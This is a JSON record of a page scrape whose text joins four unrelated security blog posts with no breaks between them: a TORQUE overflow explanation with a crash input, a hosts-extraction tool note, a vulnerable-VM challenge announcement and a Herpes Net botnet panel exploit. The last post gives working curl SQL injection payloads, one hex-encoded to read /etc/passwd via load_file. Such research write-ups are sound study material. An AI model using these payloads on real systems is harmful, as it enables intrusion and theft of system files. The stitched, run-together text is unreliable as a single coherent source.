{"pages":[{"loc":"https://bwall.github.io/torque-exploitation-explained.html","tags":"Exploit","text":"The purpose of this post is to explain the TORQUE vulnerability I recently created a proof of concept for. Since the proof of concept was just a simple stub, I feel the mechanics behind the exploit should be described as well. TORQUE To be completely honest, I have never used TORQUE before attempting to exploit it. I was looking for a vague CVE to proof of concept, and this one did not appear to obscure CVE-2014-0749 . Since this application is open source, I was able to download and review the source code for this. I was also able to see the pull request for resolving this issue (easy mode, amirite?). The line of code we are looking to exploit is here . Libdis defines the protocol used for network communication, and we are exploiting a weakness in its core ability to function. I'll explain the relevant parts of this protocol. Essentially, when reading in data, this protocol parses arbitrarily large data by first reading a digit. This digit dictates how many digits will define how large the data will be. Since the buffer for storing this data is only 64 bytes on an x64 machine, any value larger than two here will eventually lead in an overflow. After it reads this first character, it then calls itself again to parse the digits for the size. After parsing n digits, it now has its count for its final call to disrsi_. In this call, we need to have it start with a digit again in order to reach the code we are exploiting. The pull request mentioned before adds a check at the beginning of the function to check the size of data to be read in. Since the check actually happens after information is read from the socket pre-pull request, we can read in as much as 999999999 bytes (actually quite a bit less due to section restrictions). Looking at the code, this issue may not be apparent, as where is the memcpy we are supposed to be exploiting? Its in the tcp_gets at line 467 . So essentially, to exploit this, we need to send three numbers. The first is a single digit which defines the number of digits in the next number, and the second defines the size of the data we will overflow with. Then another digit to continue to hit the tcp_gets function we need to exploit. We can simply connect with a TCP socket, send \"39991\" then 999 A's to cause the crash.

The first of these tools to be posted publicly is Extract Hosts . The purpose of this utility is to search for domain names and IP addresses in the supplied input. The following is information posted to the readme on the project page. You can download the 1.1.0 release of Extract Hosts here . ExtractHosts Extracts hosts (IP/Hostnames) from files. Hosts can be extracted from text files, PE, etc. Any file that keeps the host in plaintext without obscuring it, this should extract it. The name came about when polling random people on the street about the idea, and they responded, \"eh?\". With this installed, all you need to type is 'eh' to start pulling hosts from input.

One of the reasons I do this is because such a small section of the industry is exposed to botnet panels, and the easiest way to get acquianted is by pwning them. It also gives people an opportunity to legally use my exploits without hunting down the source code for the command and control panels themselves. In this vulnerable virtual machine, you get an opportunity to \"Murder Dexter\", the point of sale malware. Murdering Dexter Much like my other vulnerable virtual machines, there are no supplied credentials. The virtual machine itself uses DHCP to get an IP address, and while it does not need Internet access itself, you may wish to reference the Internet for some portions. If you need to change something in the virtual machine in order to use it, you should be able to edit the shadow file in a live cd without hindering the challenge.

The following vulnerability is one of them. Herpes Net is botnet with a wide range of functions, with everything from opening the CD tray to mining bitcoins (via plugins). With a vulnerability in the command and control panel, we can get information on the botnet operator. When this vulnerability was discovered by myself, I had thought it was a rediscovery of a vulnerability discovered by malware.lu. Upon further investigation into their proof of concept, I found that the parameter they are injecting on no longer exists. Instead of injecting on the 'id' parameter, we can inject on the the 'hwid' parameter. The following is the vulnerable code (only relevant code displayed). $ hwid = $ _POST [ ' hwid ' ]; if ( $ header == \"74978b6ecc6c19836a17a3c2cd0840b0\" ) { if ( $ hwid <> \"\" ) { $ bottest = mysql_query ( \"SELECT * FROM clients WHERE hwid = '$hwid'\" ); while ( $ row = mysql_fetch_array ( $ bottest )) { $ id = $ row [ ' id ' ];} if ( mysql_num_rows ( $ bottest ) == 1 ){ $ result = mysql_query ( \"SELECT * FROM commands WHERE botid = '$id' AND viewed = '0' LIMIT 1\" ); while ( $ row = mysql_fetch_array ( $ result )) { echo $ row [ ' cmd ' ]. \"|\" . $ row [ ' variable ' ]; A keen eye will notice that there are two vulnerable queries in this code selection. The first query, while injectable, does not have a direct influence on output. While blind SQL injection is not improbable, it does make for quite a bit more noise when trying to extract information. Just for reference though, here is a proof of concept blind SQLi. curl - A \"74978b6ecc6c19836a17a3c2cd0840b0\" - v http : //c2.com/panels/herpes/run.php -d \"hwid=' AND 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,BENCHMARK(10000, SLEEP(1000)) -- --\" This should sleep for quite a while if exploited successfully. If only we can get a result from the database to print out, we could use a much simpler, faster and quieter exploit. If we return a SQL injection payload from the first query, we can exploit the next one, and return data to be read. Here is what we want in our second query's payload for a proof of concept. ' AND 1 = 2 UNION ALL SELECT 1 , 2 , load_file ( ' / etc / passwd ' ), 4 , 5 -- -- In order to do that, we should hex encode it. 0x2720414e4420313d3220554e494f4e20414c4c2053454c45435420312c322c6c6f61645f66696c6528272f6574632f70617373776427292c342c35202d2d202d2d And now our proof of concept looks like the following. curl - A \"74978b6ecc6c19836a17a3c2cd0840b0\" - v http : //c2.com/panels/herpes/run.php -d \"hwid=' AND 1=2 UNION ALL SELECT 0x2720414e4420313d3220554e494f4e20414c4c2053454c45435420312c322c6c6f61645f66696c6528272f6574632f70617373776427292c342c35202d2d202d2d,2,3,4,5,6,7,8,9 -- --\" The data returned will be followed by '|4' as that is what is being returned in the 'variable' row. We can of course control this value as well if needed.
